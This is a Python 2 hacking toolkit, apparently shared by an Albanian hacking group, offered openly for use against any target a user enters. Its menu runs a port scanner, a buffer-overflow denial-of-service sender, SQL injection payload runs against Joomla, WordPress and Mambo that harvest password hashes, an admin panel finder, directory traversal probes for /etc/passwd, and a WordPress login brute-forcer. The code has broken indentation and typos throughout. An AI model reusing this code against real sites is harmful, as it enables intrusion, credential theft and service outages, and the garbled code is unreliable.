#!/usr/bin/python
#I AM PROUD TO BE ALBANIAN!
#
#Coder : X-h4ck , mem001[at]live[dot]com, www.pirate.al , www.flashcrew.in
#Thx : mywisdom - Danzel - Wulns - ev1lut10n - IllyrianWarrior - Ace - M4yh3m - Saldeath
#Lekosta - Pretorian - bi0 - Slimshaddy - d3trimentaL - Dr.Moka - th3p0w3r -  RC - Hack-D0wn - H3ll
#and big puthje to h4x0rs army, mump,IRT,xr4ge
#http://myw1sd0m.blogspot.com , http://www.flashcrew.in, http://h4x0rs.net
#http://www.devilzc0de.org, http://bukibv.blogspot.com , http://its-ownz.blogspot.com
#E kam punuar shpejt e shpejt, ashtu qe per ndonje gabim mos e merrni per te madhe
#I've done it quickly, so for any mistake don't yell at me god dammit
#PART 1 , download this: www.pirate.al/psquirt.rar(amd.txt,dirs.txt,jmsql.txt,wpsql.txt,msql.txt,wd.txt) in the same dir as psquirt.py
#18.01.2012 , shared : 11.06.2012

from socket import *
import time
import datetime
import sys
import re
from time import sleep
import urllib
import urllib2
import os
import httplib
import httplib2
from urllib2 import Request, urlopen, URLError, HTTPError


print " "
print " "
pirate = "      ---------------------------------------\n"
pirate +="               PirateAL       \n"
pirate +="             www.pirate.al     \n"
pirate +="                                       \n"
pirate +="      ---------------------------------------\n"
print pirate

print "CWD : ", os.getcwd( )
print "Sot eshte dita e", time.localtime()[7], "e ketij viti!"
saldeath = datetime.date.today()
print "Data :", saldeath


print " "
print " "
m4yh3m = 'I LOVE PIRATEAL'  
print m4yh3m[0:3], m4yh3m[4:15]
danzel = (raw_input("what's missing ? "))
if danzel == 'O':
    pass
    print " "
    print "Good Job :) "
else:
    print " Good Bye ;) & love Off noob"
    sys.exit()

print " "
print " Hmmm, chit chat ? "
mosha = int(raw_input(" How old are u man ? "))
if mosha >= 15:
   pass
else:
   print " Go and love urself, SK"
   sys.exit()
print " "
print " "
def menyja():
   print "It's time to chooce : "
   print " "
   print "1)  [x] Get real IP behind CloudFlare (PHP code generate) " # love THE CLOUDFLARE!
   print "2)  [x] Scann Open ports "  #simple
   print "3)  [x] HTTP/FTP Buffer Overflow / DoS Vulnerability Test " #simple
   print "4)  [x] Web Application (Remote SQL Injection) "
   print "5)  [x] Admin Panel Finder "
   print "6)  [x] Directory Traversal "
   print "7)  [x] Bruteforcer "
   print "8)  [x] Quit "
   print "\n "
   print "\n "
   return input(" Zgjedhni mundesine : ")
  
loop = 1  #

zgjedhja = 0

while loop == 1:
     zgjedhja = menyja()
     if zgjedhja == 1:

        print "\n"
        print " Get real IP behind CloudFlare (PHP Code generate) \n"
        print "\n"

        try:

            filename = "fuckcloudf.php"
        
            clf = '<?php \n'
            clf += '/* love CloudFlare  \n'
            clf += '$fuckcloud = dns_get_record("site.com", DNS_TXT);  \n'
            clf += 'echo "Rezultati = ";  \n'
            clf += 'print_r($fuckcloud); \n'
            clf += '?>'
            FCLF = open(filename, "w")
            FCLF.write(clf)
            FCLF.close()
            print " [*] Done, check ",filename
        print "\n"
        print "\n"
            sleep(2)

        except:

            print " [-] Error "

     elif zgjedhja == 2:
        print " "
        print " "
        print " [x] Open Ports canner, simple one, very simple" # simple
        
        if __name__ == '__main__':  
            

            target = raw_input(" Target : \n")

            for porti in range(21, 44334):  # love YEA, ALL DIZ PORTZ
                try:
                    PortHap = socket(AF_INET, SOCK_STREAM)  
                    rezultati = PortHap.connect_ex((target, porti))  
                    frr = PortHap.recv(1024)
                    print frr, '%s %d: OPEN' % ('Port', porti)
                    PortHap.close()
                except:
                    print '%s %d: boop' % ('Port', porti)
        print "\n"

     elif zgjedhja == 3:
         print "\n"
     print "HTTP/FTP BoF/Dos Vulnerability Tester "
     def vbzgj():
        print "1) [x] Web Server Vulnerability Testing(BoF,DoS) "
            print "2) [x] FTP Service Vulnerability Testing(BoF,DoS)"
            print "3) Quit "
            print " "
            return input(" Zgjidhni : ")
         loop = 1
         vzgj = 0
         while loop == 1:
           vzgj = vbzgj()
           if vzgj == 1:
                   target_address = raw_input (" Target : ")
                   target_port = 80
                   junk = "GET " + "\x41" * 5000 + " HTTP/1.1\r\n\r\n" # Nderro ;p (if needed)
                   try:
                            sck=socket(AF_INET, SOCK_STREAM)
                            print "[x] Connecting to target "
                            time.sleep(2)
                            connect=sck.connect((target_address,target_port))
                            print "[x] Sending Evil Buffer "
                            time.sleep(2)
                            sck.send(junk)
                            sckk.close()
                            check = raw_input("[x] Check if target is down y/n : ")
                            if check == 'y':
                    try:
                         print "[!] Trying to connect to target "
                         time.sleep(2)
                         sck.connect((target_address,target_port))
                         print "[x] Target is up"
                                except:
                         print "[x] Target seems to be down"
                            elif check == 'n':
                    sys.exit()
                   except:
                   print " [-]"
                   sys.exit()
           elif vzgj == 2:
                   ftptarget = raw_input (" Target : ")
                   junki = "\x41" * 5000 # Nderro :) (if needed)
                   try:
                            s=socket(AF_INET, SOCK_STREAM)
                            ftpu = raw_input (" USER : ")
                            s.send("USER" + ftpu + "\r\n")
                            time.sleep(2)
                            s.recv(1024)
                            ftpp = raw_input(" PW : ")
                            s.send("PASS" + ftpp + "\r\n")
                            time.sleep(2)
                            s.recv(1024)
                            command = raw_input(" FTP command : ")
                            s.sendto(command + junki + "\r\n", (ftptarget, 21))
                            s.recv(1024)
                            s.close()
                            check = raw_input("[x] Check if target is down y/n : ")
                            if check == 'y':
                                try:
                         print "[!] Trying to connect to target "
                         time.sleep(2)
                         connect=s.connect((ftptarget, 21))
                         print "[x] Target is up"
                                except:
                         print "[x] Target seems to be down"
                            elif check == 'n':
                         sys.exit()
                   except:
                   print " [-] Error "
                   sys.exit()
        

     elif zgjedhja == 4:

        def webapp():
                 print "1) [x] Joomla Remote SQL Injection "
                 print "2) [x] WordPress Remote SQL Injection "
                 print "3) [x] Mambo Remote SQL Injection "
                 print "4) [x] Quit "
                 return input (" - Zgjedhni Mundesite : ")
        webappzgj = 0
        while loop == 1:
                    webappzgj = webapp()
                    if webappzgj == 1:
                        print " "
                        print " [*] Joomla SQL Injection\n"

                        try:

                            vulns = open("jmsql.txt","r").readlines()
                            print "\n"
                            print " [*] List has been loaded"
                            sleep(1)

                        except IOerror:

                            print " [-] Error Loading the list\n "
                            sleep(1)
                            sys.exit()
                        print "example : http://www.site.com/"
                        site = raw_input(" Targets : " )
                        for vuln in vulns:
                            vuln = vuln.replace("\n","")

                            try:

                                rezi = urllib2.urlopen(site+vuln, "80").read()
                                Hashs = re.findall("[a-f0-9]"*32,rezi)
                                if len(Hashs) >=1:
                                    print "hash :"
                                    for hash in Hashs:
                                        print "\b [x] ",hash

                            except(urllib2.URLError):

                                pass
                                print " [-] Error\n"
                        print "\n"
                    elif webappzgj == 2:
                        print " "
                        print " [*] WordPress SQL Injection\n"

                        try:

                            vulns = open("wpsql.txt","r").readlines()
                            print "\n"
                            print " [*] List has been loaded"
                            sleep(1)

                        except IOerror:

                            print " [-] Error Loading the list\n "
                            sleep(1)
                            sys.exit()
                        print "example : http://www.site.com/"
                        site = raw_input(" Target : " )
                        for vuln in vulns:
                            vuln = vuln.replace("\n","")

                            try:

                                rezi = urllib2.urlopen(site+vuln, "80").read()
                                Hashs = re.findall("[a-f0-9]"*32,rezi)
                                if len(Hashs) >=1:
                                    print "hash :"
                                    for hash in Hashs:
                                        print "\b [x] ",hash

                            except(urllib2.URLError):

                                pass
                                print " [-] Error\n"
                        print "\n"
                    elif webappzgj == 3:
                        print " "
                        print " Mambo Remote SQL Injection\n"

                        try:

                            vulns = open("msql.txt","r").readlines()
                            print "\n"
                            print " [*] List has been loaded"
                            sleep(1)

                        except IOerror:

                            print " [-] Error Loading the list\n "
                            sleep(1)
                            sys.exit()
                        print "example : http://www.site.com/"
                        site = raw_input(" Target : " )
                        for vuln in vulns:
                            vuln = vuln.replace("\n","")

                            try:
                                rezi = urllib2.urlopen(site+vuln, "80").read()
                                Hashs = re.findall("[a-f0-9]"*32,rezi)
                                if len(Hashs) >=1:
                                    print "hash :"
                                    for hash in Hashs:
                                        print "\b [x] ",hash

                            except(urllib2.URLError):

                                pass
                                print " [-] Error\n"
                        print "\n"
                    elif webappzgj == 5:

                        print " "
                        print " bye ..  "
                        print " "
                        sys.exit()
     elif zgjedhja == 5:

        def admincp():
            print " "
            print "1) / "
            print "2) .php "
            print "3) Quit "
            print " "
            return input(" Zgjidhni : ")

        acpzgj = 0
        while loop == 1:
                    acpzgj = admincp()
                    if acpzgj == 1:
                       print " "
                       print " Admin Panel Finder .. "
                       print " please be patient :* "
                       print " "

                       try:

                           admps = open("adm.txt","r").readlines()
                           print "\n"
                           print " [*] List has been loaded"
                           sleep(1)

                       except IOerror:

                           print " [-] Error Loading WordList\n "
                           sleep(1)
                           sys.exit()

                       target = raw_input(" Target , example : www.site.com : " )
                       print " [x] Starting "
                       sleep(1)
                       for admp in admps:
                           admp = admp.replace("\n","")

                           try:
                               adfin = "/" + admp + "/"
                       conn = httplib.HTTPConnection(target)
                       conn.request("GET",adfin)
                       response = conn.getresponse()
                       if response.status == 200:
                                       print " ", admp, response.reason
                           except:

                               pass
                               print " [-] Error \n"
                       print "\n"
                    elif acpzgj == 2:
                       print " "
                       print " + Admin Panel Finder (*.php) "

                       try:

                           admps = open("adm.txt","r").readlines()
                           print "\n"
                           print " [*] List has been loaded"
                           sleep(1)

                       except IOerror:

                           print " [-] Error Loading WordList\n "
                           sleep(1)
                           sys.exit()

                       target = raw_input(" Target , example : www.site.com : " )
                       print " [x] Starting "
                       sleep(1)
                       for admp in admps:
                           admp = admp.replace("\n","")

                           try:

                               adfin = "/" + admp + ".php"
                       conn = httplib.HTTPConnection(target)
                       conn.request("GET",adfin)
                       response = conn.getresponse()
                       if response.status == 200:
                                       print " ", admp, response.reason
                           except:

                               pass
                               print " [-] Error \n"
                       print "\n"
     elif zgjedhja == 6:

        print " "
        print " DIRECTORY TRAVERSAL"
        print " "

        try:

            dirs = open("dirs.txt","r").readlines()
            print "\n"
            print " [*] List has been loaded"
            sleep(1)

        except IOerror:

            print " [-] Error Loading WordList\n "
            sleep(1)
            sys.exit()

        site = raw_input(" Target , example : http://www.site.com/page.php?f= : " )
        for dir in dirs:
            dir = dir.replace("\n","")
            try:
                rezi = urllib2.urlopen(site+dir).read()
                if re.search("root:x",rezi) != None:
                       print site+dir
            except:
                pass

     elif zgjedhja == 7:

        def bruteforce():
             print "\n"
             print " [*] Brute - Force "
             print "\n"
             print "1) [x] WordPress "
             print "2) [x] Try "
             print "3) [x] Exit "
             return input ( " Zgjedhni mundesine ")
        bf = 0      
        while loop == 1:
                     bf = bruteforce()
                     if bf == 1:
                         print " [*] WordPress Admin Login Brute-Force\n"
                         print " example : http://site.com/wp-login.php\n"
                         target = raw_input("Target :")

                         try:

                             fjalte = open("wd.txt","r").readlines()
                             print "\n"
                             print " [*] WordList has been loaded"
                             sleep(1)

                         except IOerror:

                             sleep(1)
                             print " [-] Error Loading WordList\n "
                             sys.exit()

                         print " [*] Brute-Force Attack Starting ... "
                         print " [*] www.pirate.al\n "
                         sleep(1)
                         for fjala in fjalte:

                             fjala = fjala.replace("\n","")

                             user_agent = ['Mozilla/5.0 (X11; Linux x86_64; rv:2.0) Gecko/20100101 Firefox/4.0' ,
                                           'Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2' ,
                                          'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5' ]
                             header = { 'User-Agent' : user_agent }
                             te_dhenat = { 'log' : "admin" , 'pwd' : fjala }

                             enc_te_dhenat = urllib.urlencode(te_dhenat)
                             kontrolla = urllib2.Request(target+"/wp-login.php", enc_te_dhenat, header)
                             pergj = urllib2.urlopen(kontrolla)
                             rezf = pergj.read()

                             if re.search("ERROR",rezf) == None:

                                 print " [+] Password :", fjala
                                 sleep(1)
                             else:

                                 print " [-] Error "
                                 pass

                     if bf == 2:

                         print " Going to add more on next version "
                         print " Skam koh "

                     if bf == 3:
                         sys.exit()

     elif zgjedhja == 8:
        why ="                               __ \n"
        why +="                            __/o \_ \n"
        why +="                            \____  \ \n"
        why +="                                /   \ \n"
        why +="                          __   //\   \ \n"
        why +="                       __/o \-//--\   \_/ \n"
        why +="                      \____  ___  \  | \n"
        why +="                           ||   \ |\ | \n"
        why +="                          _||   _||_|| \n"
        why +="                            CYA BITCH!"
        why += " "
        print why
        loop = 0
        sys.exit()
